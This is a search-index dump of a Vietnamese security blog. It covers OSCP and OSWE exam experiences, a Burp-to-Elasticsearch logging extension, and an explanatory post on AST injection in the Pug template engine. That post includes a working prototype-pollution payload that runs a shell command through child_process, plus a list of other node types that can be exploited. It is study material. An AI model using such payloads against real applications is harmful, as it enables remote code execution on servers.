[{"categories":null,"content":"Finish my year\rBan đầu mình không định đăng kí học OSWE vì vừa lấy OSCP xong cộng thêm việc cũng nhiều nữa. Tuy nhiên, lại xảy ra sự việc ngoài ý muốn nên vào buổi tối đó chả hiểu nghĩ thế nào 12h đêm dậy đăng kí OSWE và thế là bay luôn 1649$ vì một phút bốc đồng. Sáng hôm sau, thấy bản thân tự hủy rồi nhưng lỡ rồi thì lại phải học =\u003e hành trình 2 tháng try hard bắt đầu. ","date":"2022-11-28","objectID":"/oswe/:0:0","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"OSWE là gì ","date":"2022-11-28","objectID":"/oswe/:1:0","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"Course Advanced Web Attacks and Exploitation (WEB-300) là khóa học bảo mật ứng dụng web theo hướng whitebox và cũng là ước ao của mình tại thời điểm đăng kí. Đây là khóa học nâng cao vì nó yêu cầu một số kiến thức trước khi học như là Có khả năng viết và đọc code. Hiểu rõ về các loại tấn công web. Sử dụng thành thạo web proxy như là Burp. … Sau khi học mình thấy một số ưu và nhược điểm của khóa học Ưu điểm: Cung cấp cho người học một các nhìn toàn diện cũng như hiễu rõ về từng loại lỗ hổng được đề cập. Các bài tập Extra Miles giúp kiểm tra kiến thức được truyền tải trong từng module. Video hướng dẫn khá là chi tiết và dễ hiểu. Nhược điểm: Các máy lab còn khá ít không như OSCP làm ngập mồm Chưa đề cập các lỗi mới xuất hiện như Broken Auth, OAuth 2.0, … ","date":"2022-11-28","objectID":"/oswe/:1:1","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"Exam Để có được chứng chỉ bạn sẽ phải vượt qua 1 bài thi bao gồm source code của 2 web app và có 48h tuyệt vọng để đạt ít nhất 85/100 and … ","date":"2022-11-28","objectID":"/oswe/:1:2","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"Hành trình để lấy chứng chỉ ","date":"2022-11-28","objectID":"/oswe/:2:0","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"Learn Trong quá trình học mặc dù được hướng dẫn theo cách tiếp cận whitebox nhưng mình luôn bắt đầu thử với blackbox vì đa số công việc hàng ngày mình sẽ phải tiếp cận theo hướng này. Mục tiêu của mình là sẽ cố gắng tìm ra lỗi bằng blackbox với tất cả module được học, mặc dù không đạt được mục tiêu đề ra nhưng mình cũng khá hài lòng với những bài mình đã làm được bằng blackbox. Mình sử dụng Notion để ghi lại các điểm chú ý của module đấy như: flow code dẫn đến lỗ hổng, tại sao lỗ hổng lại xảy ra, suy nghĩ của bản thân về các vector, payload được sử dụng, … Mình mất khoảng 2 tháng (đa số thời gian mình sử dụng là cho việc blackbox) để hoàn thành tất cả các module được hướng dẫn và extra miles, tiếp đến là làm 3 bài cuối cùng không có hướng dẫn để kiểm tra kiến thức đã được học cũng như là tăng độ tự tin cho bản thân. Sau 2 ngày, mình hoàn thành cả 3 bài và lúc đó cảm thấy “feel a godlike” liền đi đăng kí ngày thi luôn. Ban đầu, mình chọn thi ngày 5/12 nhưng sau 1 hôm mình lại cảm thấy ghét cái cảm giác chờ đợi này nên đã chuyển thành ngày 18/11. ","date":"2022-11-28","objectID":"/oswe/:2:1","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"Exam Bằng 1 cách thần kì nào đó cả 2 lần mình thi OSCP và OSWE đều vào các dạng mình cực gì ghét là BOF và Client-side Attack không phải vì nó khó mà nó tốn nhiều thời gian để khai thác. Bài đầu tiên mình mất khoảng 2h để tìm vector bypass auth, có khá là nhiều rabbit hole nếu bạn không nhận ra sớm sẽ rất tốn thời gian. Một khi bạn bypass được auth thì RCE nó chỉ là vấn đề thời gian và cái giá mình phải trả ở đây chỉ là 2h. Vậy là sau 4h mình đã có được 50 points và chỉ cần tìm được vector bypass auth ở bài 2 là đủ điểm. Sau khi đọc mô tả của bài mình nghĩ thôi lại gặp Client-side Attack, do biết được vector bypass auth nên mình tìm được vector ngay sau đó khoảng 1h. Vector RCE bài 2 mình tìm được cũng không lâu sau đó nhưng nó khá là tốn time để khai thác nên mình đã cố chấp không theo hướng đấy mà tìm một hướng khác ít tốn thời gian hơn và kết quả và mình tốn thời gian x2 cho việc RCE. Vậy là sau khoảng 15h try hard thì mình đã đạt được 100 points, đến lúc này mình khá là vui nên xin break tí để đi gáy và chuẩn bị cho phần khó nhất là viết POC và report. Viết report tiêu tốn của mình đâu đó khoảng 10h chỉ ngồi viết xong lại xóa, mình cảm thấy việc viết report nó còn khó hơn cả lúc làm bài thi vì nó đem lại cảm giác nhàm chán kinh khủng ! ","date":"2022-11-28","objectID":"/oswe/:2:2","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"Suy nghĩ Sau khi pass OSWE mình cảm thấy khá là vui vì trong quá trình học mình tiếp thu thêm được rất nhiều kiến thức mới, cách tiếp cận vấn đề và mindset try harder. Tuy nhiên, mình vẫn cảm thấy hơi hụt hẫng vì mình mong đợi exam sẽ đem lại nhiều thử thách hơn cho mình để rồi vui sướng khi vượt quá các thử thách khó khăn. ","date":"2022-11-28","objectID":"/oswe/:3:0","tags":["OSWE"],"title":"Đôi lời về OSWE","uri":"/oswe/"},{"categories":null,"content":"Chỉ là note lại những gì đã học được\rTrong khi đang speedrun OSWE đến những chương cuối của OSWE thì tôi gặp dạng bài Prototype Pollution (dạng bài mà tôi trước giờ chỉ copy \u0026 paste payload như 1 thằng n00b , anyway bây giờ vẫn là 1 thằng n00b) và nếu muốn rõ về cách payload hoạt động như thế nào thì tôi lại phải đi học Javascript. Một ngôn ngữ tôi không thích lắm vì logic ảo ma của nó nhưng biết sao giờ chẳng lẽ lại bỏ qua chương này và thế là lại phải học thôi !! ","date":"2022-11-06","objectID":"/ast-injection/:0:0","tags":null,"title":"AST Injection","uri":"/ast-injection/"},{"categories":null,"content":"AST là gì Hiểu đơn giản AST (Abstract Syntax Tree) là cây biểu diễn cấu trúc cú pháp của mã nguồn của một ngôn ngữ nhất định ( Chi tiết ) AST được sử dụng thường xuyên trong JS ví dụ như: template engines, typescript, … ( tôi cũng không rõ dùng ở typescript chỗ nào vì đọc nó bảo thế thì list nhìn cho nó dài thôi 🙃). Trong bài này thì ta tập trung vào template engines. Flow chung cho template engines như ảnh dưới đây: ","date":"2022-11-06","objectID":"/ast-injection/:1:0","tags":null,"title":"AST Injection","uri":"/ast-injection/"},{"categories":null,"content":"Pug Template Engines Trong bài này ta sẽ đi vào cụ thể một template engines đó là Pug vì đây là một trong nững template engines khá phổ biến của JS. Flow của Pug như sau: Đầu tiên chúng ta xem cách khai báo để tạo ra một template. const pug = require('pug'); // Compile the source code const compiledFunction = pug.compileFile('template.pug'); // Render a set of data console.log(compiledFunction({ name: 'Timothy' })); // \"\u003cp\u003eTimothy's Pug source code!\u003c/p\u003e\" // Render another set of data console.log(compiledFunction({ name: 'Forbes' })); // \"\u003cp\u003eForbes's Pug source code!\u003c/p\u003e\" Ở đây nhận tham số đầu vào là một file có chứa các cú pháp của Pug. Sau khi xem xét qua hàm thì tôi tóm gọn lại là flow như sau compileFile =\u003e handleTemplateCache =\u003e compile nên chúng ta sẽ bắt đầu từ hàm compile(/pug/lib/index.js). Trong hàm compile sẽ gọi đến hàm compileBody (hàm này trả về 1 object có thuộc tính body chứa code JS được tạo ra) function compileBody(str, options) { ... var ast = load.string(str, { //magic }) ... return {body: js, dependencies: dependencies}; } Tiếp tục gọi đến hàm load và 1 cách magic ta có được giá trị AST. Sau khi có AST thì nó được truyền vào hàm generateCode (như cái tên của nó hàm này trả về code JS được tạo bởi AST) var js = (findReplacementFunc(plugins, 'generateCode') || generateCode)(ast, { pretty: options.pretty, compileDebug: options.compileDebug, doctype: options.doctype, inlineRuntimeFunctions: options.inlineRuntimeFunctions, globals: options.globals, self: options.self, includeSources: options.includeSources ? debug_sources : false, templateName: options.templateName, }); Lần mò vào hàm generateCode thì hàm này tạo ra một đối tượng Compiler và gọi đến phương thức compile function generateCode(ast, options) { return new Compiler(ast, options).compile(); } =\u003e compile: function() { ... this.visit(this.node); // code được gen và đẩy vào buff ở đây ... Từ đây tất cả logic tạo code js từ AST đều ở đây.Ta sẽ phân tích 1 ví dụ như sau: const pug = require('pug'); compiledFunction = pug.compile(\"nothing\",{debug:true}) Bây giờ giá trị của AST sẽ là: Flow cơ bản của quá trình này là visit: function(node, parent) { var debug = this.debug; if (!node) { ... } if (debug \u0026\u0026 node.debug !== false \u0026\u0026 node.type !== 'Block') { if (node.line) { var js = ';pug_debug_line = ' + node.line; if (node.filename) js += ';pug_debug_filename = ' + stringify(node.filename); this.buf.push(js + ';'); } } if (!this['visit' + node.type]) { // Kiểm tra valid type của node ... } this.visitNode(node); // gọi đến hàm gen code với các type tương ứng } Một số hàm gen code với các type visitText: function(text) { this.buffer(text.val); } ------------------------------------------------------- visitComment: function(comment) { if (!comment.buffer) return; if (this.pp) this.prettyIndent(1, true); this.buffer('\u003c!--' + comment.val + '--\u003e'); } ------------------------------------------------------- visitCode: function(code) { // Wrap code blocks with {}. // we only wrap unbuffered code blocks ATM // since they are usually flow control // Buffer code if (code.buffer) { var val = code.val.trim(); val = 'null == (pug_interp = ' + val + ') ? \"\" : pug_interp'; if (code.mustEscape !== false) val = this.runtime('escape') + '(' + val + ')'; this.bufferExpression(val); } else { this.buf.push(code.val); } // Block support if (code.block) { if (!code.buffer) this.buf.push('{'); this.visit(code.block, code); if (!code.buffer) this.buf.push('}'); } }, ","date":"2022-11-06","objectID":"/ast-injection/:2:0","tags":null,"title":"AST Injection","uri":"/ast-injection/"},{"categories":null,"content":"Exp Payload Prototype Injection const pug = require('pug'); Object.prototype.block = {\"type\": \"Text\", \"line\": \"console.log(process.mainModule.require('child_process').execSync('id').toString())\"}; pug.compile('h1= msg', {debug:true}); Template Function được trả về đã được injection Compiled Function: function template(locals) {var pug_html = \"\", pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {; var locals_for_with = (locals || {}); (function (console, msg, process) { ;pug_debug_line = 1; pug_html = pug_html + \"\\u003Ch1\\u003E\"; ;pug_debug_line = 1; pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? \"\" : pug_interp)); ;pug_debug_line = console.log(process.mainModule.require('child_process').execSync('id').toString()); pug_html = pug_html + \"ndefine\\u003C\\u002Fh1\\u003E\"; }.call(this, \"console\" in locals_for_with ? locals_for_with.console : typeof console !== 'undefined' ? console : undefined, \"msg\" in locals_for_with ? locals_for_with.msg : typeof msg !== 'undefined' ? msg : undefined, \"process\" in locals_for_with ? locals_for_with.process : typeof process !== 'undefined' ? process : undefined)); ;} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;} Lúc này trong đầu mình có câu hỏi tại sao lại là type Text chứ không phải các type khác và liệu có type nào còn có thể khai thác được không. Sau 1 hồi debug thì mình tìm ra được các type có thể lợi dụng cần phải thỏa mãn 2 điều kiện: Có hàm visitType (visitCode, visitTag, ..) Thuộc các case sau để tránh gọi đến hàm walkAST 1 lần nữa và mình tìm thêm được 1 số type hợp lệ. case 'Attrs': case 'BlockComment': // work case 'Comment': // work case 'Doctype': // work case 'IncludeFilter': case 'MixinBlock': // work case 'YieldBlock': // work case 'Text': // break; Liệu payload trên có hoạt động với mọi template không? =\u003e Câu trả lời là không nếu template không tham chiếu đến giá trị nhận từ argument.( điều này khó xảy ra vì nếu không tham chiếu đến đến các biến được truyền vào thì đã không sử dụng template từ ban đầu) Ví dụ về một template mà payload trên không hoạt động. pug.compile('h1', {debug:true}) ---------------------------------- Compiled Function: function template(locals) {var pug_html = \"\", pug_mixins = {}, pug_interp;var pug_debug_filename, pug_debug_line;try {;pug_debug_line = 1; pug_html = pug_html + \"\\u003Ch1\\u003E\\u003C\\u002Fh1\\u003E\";} catch (err) {pug.rethrow(err, pug_debug_filename, pug_debug_line);};return pug_html;} Tuy nhiên mình phát hiện ngay cả trong trường hợp trên, ta vẫn có thể khai thác được cũng bằng Prototype Pollution và mình để tự bạn tìm ra câu trả lời cho trường hợp trên. (dễ quá nó chán lắm 😂😂) ","date":"2022-11-06","objectID":"/ast-injection/:3:0","tags":null,"title":"AST Injection","uri":"/ast-injection/"},{"categories":null,"content":"Tham khảo https://blog.p6.is/AST-Injection/#Pug ","date":"2022-11-06","objectID":"/ast-injection/:4:0","tags":null,"title":"AST Injection","uri":"/ast-injection/"},{"categories":null,"content":"New series from 0 to 1k stars 🤡🤡\r","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:0:0","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Mở đầu Trong một lần tình cờ được ngồi nói chuyện với anh Luật ( Founder của CyberJustu ), mình đã được anh chia sẻ rất nhiều vấn đề hay và bị ấn tượng bởi câu hỏi “Bọn em làm gì với đống request sau 1 dự án pentest?”. Tại thời điểm đó, mình chỉ quan tâm đến report của dự án như là: Có tìm được lỗi không, mức độ ảnh hưởng ra sao hay cách khai thác có gì mới lạ không ?. Sau khi nghe câu trả lời từ anh mình kiểu. Đại khái ý tưởng là: Burp =\u003e Request =\u003e Log =\u003e Big Data =\u003e Process =\u003e Do something Có ý tưởng rồi thì phải làm thôi Gét Go My Data My Choice. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:1:0","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"ELK Stack Nghĩ đến việc ghi log thì ELK stack là trùm, nói sơ qua một chút về ELK Stack thì đây là combo thần thánh trong việc logging. ELK Stack bao gồm 3 phần: ElasticSearch: Cơ sở dữ liệu để lưu trữ, tìm kiếm và query log. Logstash: Tiếp nhận log từ nhiều nguồn, xử lý và ghi dữ liệu log vào ElasitcSearch. Kibana: Giao diện quản lý, thống kê log từ ElasticSearch. Trong trường hợp này, đa số mình sẽ chỉ lấy log từ BurpSuite nên việc sử dụng Logstash là không cần thiết nên mình rút gọn lại chỉ sử dụng ElasticSearch và Kibana. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:1:1","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"ElasticBurp-NG ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:2:0","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Logger++ và ElasticBurp Từ ý tưởng trên thì mình có 2 hướng tiếp cận: Viết 1 proxy rồi cho BurpSuite đi qua, từ đó đẩy lên ElasticSearch: Tuy nhiên, trong quá trình phát triển mình nhận thấy cách tiếp cận này có khá nhiều bất cập nên mình chọn hướng tiếp cận thứ 2. Viết BurpSuite Extension cho phép đẩy log lên ElasticSearch: Cách tiếp cận này gần như giải quyết hết các vấn đề mình quan tâm nhưng tại sao mình không chọn hướng tiếp cận này đầu tiên ?. Đơn giản mình không thích Python còn Java thì mỗi lần chỉnh sửa code lại phải compile ra file jar để sử dụng. Google Search \"How to write Burp Extension with Go\" =\u003e Rewrite Burp to support Go\r🤡🤡🤡🤡🤡🤡🤡🤡 Lượn lờ trên mạng thì thấy có 2 Burp Extension phù hợp: Logger++ và ElasticBurp. Sau khi xem cả 2 extension thì mình thấy: Logger++ nhiều chức năng không cần đến, lại viết bằng java nên nếu muốn thêm một số chức năng thì lại phải complie tốn time =\u003e Lười =\u003e Next ElasticBurp ít chức năng nhưng viết bằng Python =\u003e dễ dàng customize=\u003e Vì vậy mình sẽ lấy luôn mã nguồn của ElasticBurp được tạo bởi thomaspatzke để cải tiến cũng như phát triển thêm một số tính năng để thực hiện ý tưởng ban đầu. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:2:1","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Develop Theo như hướng dẫn của ElasticBurp trên github: Cài đặt ElasticSearch Cài ElasticBurp Cấu hình và chạy Làm theo hướng dẫn và bùm lỗi liên tục vào mồm. Đã lười thì chớ lại còn phải fix bug nữa. Dưới đây là các lỗi khiến mình nhớ nhất. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:3:0","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"TypeError: unicode indices must be integers Vừa cấu hình và nhấn apply thì đã có cái lỗi đấm vào mồm rồi. Nguyên nhân: Do sử dụng sai phiên bản thư viện elasticsearch và elasticsearch-dsl. ElasticSearch mình đang sử dụng là phiên bản 7.17.5 trong khi phiên bản của 2 thư viện elasticsearch và elasticsearch-dsl được cài theo extension là 6.0.0. Cách khắc phục: Update 2 thư viện lên phiên bản tương thích với ElasticSearch 7.x. Mình đã fix thành công và đẩy được log lên server ElasticSearch nhưng mình lại gặp vấn đề với hiệu năng. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:3:1","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Lỗi Performance Khi sử dụng extension, mình thấy hiệu năng giảm rõ rệt. Request xử lý rất là chậm khi so sánh với lúc không sử dụng. Điều này thường xuyên xảy ra với các trang web gửi nhiều request như Facebook, bình thường truy cập vào Facebook chỉ mất 1-2 giây là load xong mà khi sử dụng extension mất tới 30 giây mới load xong và nó gây khó chịu y như lúc mạng lag. Nguyên nhân : Do default timeout là 10s nên khi gặp lỗi timeout thì request phải đợi 10s mới được tiếp tục xử lý. Cách khắc phục: Giảm thời gian timeout. Vấn đề trên đã được giải quyết nhưng khi mình kiểm tra thì thấy số lượng request không đẩy lên ElasticSearch khá là nhiều. Sau khi search thì mình thấy có 2 khả năng là nguyên nhân chính: Do Server yếu không đáp ứng được. Dữ liệu lớn mà thời gian timeout đặt chưa hợp lý. Mình đã thử sử dụng Logger++ để kiểm tra xem nguyên nhân thực sự thì thấy Logger++ vẫn log được đầy đủ các requests. Tham khảo cách xử lý của Logger++ thì cách giải quyết là lưu dữ liệu và Lại quay về câu chuyện con gà và quả trứng: nếu đặt timeout thấp thì mất dữ liệu còn nếu đặt timeout cao thì request xử lý chậm. Mình đã thử sử dụng Logger++ để kiểm tra xem có gặp lỗi có phải do phía server hay không thì không thấy tình trạng tương tự xảy ra. Sau khi đọc source code , mình biết được cách cách xử lý của Logger++ là có 1 list để lưu các request và đẩy lên server sau 1 khoảng thời gian nhất định. Đến đây có thể tạm kết luận nguyên nhân là do timeout chưa hợp lý. Lại quay về câu chuyện con gà và quả trứng nếu để timeout thấp thì thường xuyên mất request còn để timeout cao thì thời gian xử lý request lâu gây khó chịu. Time to đa luồng: Cách xử lý là tạo 1 luồng để thực hiện việc ghi và tăng timeout lên =\u003e Cả 2 vấn đề đều đã được giải quyết.Tuy nhiên tình trạng mất request do timeout vẫn xảy ra nhưng không đáng kể. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:3:2","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Redis cache Đây là 1 chức năng mình thêm vào để giảm thiểu các request trùng lặp cũng như cải thiện performance. Nguyên nhân:: Trước khi thêm 1 chức năng mới mình thường kiểm tra code trên Python trước, code đã chạy như mình mong đợi nhưng lúc chạy với Burp lại thông báo lỗi liên quan đến socket. Mất khoảng 1 ngày mình mới tìm thấy nguyên nhân của vấn đề là do cách xử lý lỗi với socket của Jython trên Windows khác thông thường. Chi tiết về lỗi có thể đọc ở đây Cách khắc phục: Cách khắc phục đã được mình nói ở phần issues nên ở đây mình không nói lại nữa. Trong thời gian phát triển mình gặp khá nhiều lỗi ối dồi ôi mà không đề cập ở đây. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:3:3","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Feature Extension có 2 tính năng chính là: Tập trung log của các thành viên trong team khi pentest: Cho phép chia sẻ request Thử tưởng tượng trong trường hợp bạn gặp 1 request khả nghi dính XSS nhưng chưa tìm được cách bypass và muốn chia sẻ request đấy cho người khác thì đơn giản chỉ cần đưa mã hash của request đấy thay vì phải copy toàn bộ request. Advanced Search Sử dụng cú pháp KQL giúp nâng cao khả năng tìm kiếm. Tuy nhiên, nếu bạn muốn sử dụng chức năng này thì cần phải cài đặt thêm plugin QueryBuilderApi trên Kibana Nếu có bất kỳ lỗi nào trong quá trình sử dụng hay có ý tưởng gì các bạn có thể phản hồi để mình có thể hoàn thiện ElasticBurp-NG. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:4:0","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Install Start here 👇️👇️👇️ https://github.com/n00b-bot/elastic-burp ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:5:0","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Thanks ML from CyberJustu vì chia sẻ ý tưởng. thomaspatzke vì tạo ra ElasticBurp. DamionNg, quaccws, datmom.txt, ewind vì những đóng góp tấu hài. ","date":"2022-09-04","objectID":"/elasticburp-ng-part-1/:6:0","tags":["Burp","ElasticSearch"],"title":"My Data My Choice - P1. ElasticBurp-NG","uri":"/elasticburp-ng-part-1/"},{"categories":null,"content":"Lan tỏa tấu hài đi muôn nơi 🙃 🙃\rTôi dự định học OSCP từ tháng 8/2021 nhưng vì một số lý do mà đến tháng 3/2022 tôi mới bắt đầu đăng kí học được. Vì không phải mất tiền(làm gì có bữa trưa nào miễn phí, tôi phải anh bạn à liên tục vào mồm đấy 🤪🤪🤪) nên tôi đã đăng kí PEN-200 course + 90-days lab access. Theo lịch chính thức khóa học sẽ bắt đầu vào 13/3, nhưng sau khi nghe văn khích của 2 đồng đội ( Sợ à 🙂) tôi đã thay đổi lịch học để bắt đầu sớm hơn. Hành trình tấu hài bắt đầu từ đây(Adventure Time) Khi bắt đầu làm một thứ gì đó, tôi thường sẽ hình dung về những việc mình sẽ làm và đây cũng không phải là ngoại lệ. Tôi đã lên kế hoạch trong đầu mà theo tôi nghĩ nó là tuyệt vời con mịa nó rồi. Sơ qua về kế hoạch cực kì chi tiết: Đọc hết sách PWK Làm hết Lab được cung cấp Làm thêm với HTB và PG Viết report exercise để kiếm 10 point Như một lẽ thường tình, tôi đã hoàn thành được những 1/4 kế hoạch hoàn hảo tôi đã đặt ra là hoàn thành tất cả lab trong bài học còn các việc khác trong tình trạng như sau: Đọc sách đến 1/3 thì thấy đều là những kiến thức tôi biết rồi nên tôi quyết định tạm dừng việc đọc sách (tạm dừng vĩnh viễn chứ không phải bỏ nhé 😄)để chuyển sang thực hành. Phải thừa nhận việc viết report exercise không hề đơn giản như tôi nghĩ. Khi đã viết được 3 chương đầu và hóng được report sẽ dài khoảng 400 trang, tôi cho nó chim cút luôn. Trong 3 tháng học đó, công việc hàng ngày của tôi sẽ là dù có bận đến đâu sáng tôi cũng sẽ ngồi làm lab đến lúc ăn. Trong lúc ăn trưa thì tấu hài với 2 thằng cùng cty cũng đang học OSCP, xin được shoutout cho 2 đồng đội. Một trong 2 thằng là kẻ hủy diệt toán học, ông trùm phương pháp tính( kỉ lục 4 lần liên tiếp trượt) , thủ khoa đại học bách khoa với số điểm 29.75 aka datmom.exe ☠️ và cũng là kẻ tạo ra những câu punch line để đời. Kẻ còn lại là một con lợn trong hình hài con người và cũng là ông trùm giấu tin trong ảnh( chịuuu nhé), kẻ bề tôi của Vua nụ cười của cty. Sau khi học xong tôi mới hiểu được slogan của offsec “Try Harder !!” 💯 , cố gắng hơn nữa khi mình nghĩ mình đang cố gắng điều này giúp tôi khá nhiều trong khi làm lab. Mất khoảng 2 tháng để tôi hoàn thành hết tất cả bài lab trong khóa học, mặc dù có thể thi luôn nhưng do chưa biết đề thi format mới thế nào nên tôi quyết định mua thử 1 tháng PG để làm tiếp cũng như tăng độ tự tin khi làm bài. Dự định ban đầu của tôi sẽ là từ PG chọn ngẫu nhiên ra để thành 1 đề thi thử, tuy nhiên sau khi làm 1 số bài có cả brute force mật khẩu( hẳn phải tuyệt vọng lắm thì tôi mới nghĩ đến brute force) và trong đó cũng không hề có các bài về AD nên tôi quyết định không làm thử để tránh ảnh hưởng đến sự tự tin của mình. Cảm thấy việc chờ đợi khá là chán nản thêm việc con lợn trong hình hài con người đã tự hủy trước nên tôi quyết định đăng kí ngày thi sau nó khoảng 1 tuần tức là ngày 9/6. Quá trình làm bài cũng tấu hài không kém. “Đầu xuôi đuôi lọt” nhưng khởi đầu đã tấu hài rồi. Bắt đầu bằng việc đăng nhập vào hệ thống để thi thì hệ thống lỗi. Sau một hồi gửi mail nhờ hỗ trợ tôi được cộng thêm 30 phút do lỗi hệ thống. Kết nối thành công đến máy thi sau mở đầu không thể cồng kềnh hơn, mở đề và surprise trong đó có 5 máy trong khi đề thi bình thường là 4. Và điều tôi sợ nhất đã xảy ra BOF 🙂 từ lúc học tôi đã không thích BOF không phải vì nó khó hiểu mà nó thật sự quá dập khuôn chỉ làm theo các bước. Sau khoảng 3 tiếng tôi đã hoàn thành AD và 1 máy khác, lúc này tôi đã có 60 point ( thiếu đúng 10 point để đủ điểm đỗ). Trong đầu tôi lúc này nghĩ “Hình như chọn nhầm độ khó rồi, game này hơi dễ !!” 🙃 🙃 (gáy sớm thì làm sao nhỉ 🙂 🙂). Hai bài còn lại đấm liên tục không trượt phát nào vào mồm tôi, BOF tôi xác định bỏ ngay từ đầu nên tôi quyết định tập trung vào bài còn lại. Trong lúc recon, tôi đi làm mấy trò con bò như lên youtube nghe nhạc và suy nghĩ chuẩn bị lúc làm xong sẽ gáy những gì. Hai tiếng tiếp theo không có gì đặc biệt nên tôi xin break để ăn cơm, nghỉ ngơi thư giãn 1 tiếng sau tôi tiếp tục làm lúc đó vào khoảng 8h mà tôi tự tin trong tối sẽ làm xo","date":"2022-06-16","objectID":"/oscp/:0:0","tags":["OSCP"],"title":"Cách mà OSCP đã tấu hài với tôi😛","uri":"/oscp/"},{"categories":null,"content":"About Me","date":"2019-08-02","objectID":"/about/","tags":null,"title":"About Me","uri":"/about/"},{"categories":null,"content":" Nothing to say n00b’s adventure Gold Medal in IT Network Systems Administration at 11th Vietnam Skills Competition - 2020 Achieve OSCP - 6/2022 Make ElasticBurp-NG - 2022 Achieve OSWE - 11/2022 Achieve OSEP Achieve OSED Learn more about hacking - ","date":"2019-08-02","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]